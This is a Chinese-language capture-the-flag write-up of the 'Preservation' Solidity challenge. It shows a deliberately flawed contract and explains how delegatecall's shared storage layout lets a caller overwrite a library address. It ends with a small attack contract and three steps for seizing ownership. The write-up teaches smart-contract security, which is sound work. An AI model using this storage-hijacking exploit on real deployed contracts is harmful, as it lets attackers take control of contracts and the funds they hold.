# Preservation
Preservation要求我們成爲合約的owner,主要考察了delegatecall的一些比較細節的知識，讓我先看代碼。

## 合约代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```
## 代碼分析
可以看到，原合約中并沒有能夠重新設定owner的函數，所以我們需要找到其他的方法來改變合約的owner。合約中有兩個Library的地址，分別保存在合約storage的slot0和slot1，并且合約中主要的函數是setFirstTime和setSecondTime, 如果我們能夠改變Library的地址變成我們的惡意合約，那麽就可以進行owner的修改了。這個合約的漏洞便於此。我們看到setFirstTime是通過delegatecall來呼叫timeZone1Library，delegatecall有幾個特性我們可以回顧一下：
1. delegatecall是根據caller的context來做執行，簡單的說，如果A合約通過delegatecall B合約，那麽儅狀態函數發生變化是，是A合約的狀態函數發生變化，B只提供邏輯支持。
2. 由於特性1的緣故，A合約和B合約在狀態函數的定義書寫順序一定要保持一致，不然就會出現狀態函數賦值到錯誤slot的狀況。
3. B合約中的msg.sender就是調用A合約的地址。

所以當我們看到Library的代碼時，我們可以看見在LibraryContract中，storedTime是處於slot0的位置，但是在Preservation中，slot0的狀態變量是timeZone1Library。所以如果我們在調用setFirstTime函數時，入參設置為我們的惡意合約地址，我們就可以將timeZone1Library設置成我們的惡意合約。惡意合約中，只要設定好狀態函數的書寫順序，并且將owner=msg.sender，再次調用setFirstTime就可以將合約的owner設置成我們的地址。

## 攻擊代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    function setTime (uint256 _any) public {   //由於setTimeSignature，一定要是以setTime(uint256 var_name)的形式
        owner = msg.sender;
    }
}
```

## 攻擊過程
1. 先部署我們的惡意合約
2. 調用Preservation的setFirstTime函數，入參設置為我們的惡意合約地址,這樣timeZone1Library就會變成我們的惡意合約地址
3. 再次調用Preservation的setFirstTime函數,入參隨便輸入一個數字，這樣就會調我們惡意合約中的setTime函數，將owner設置成我們的地址。



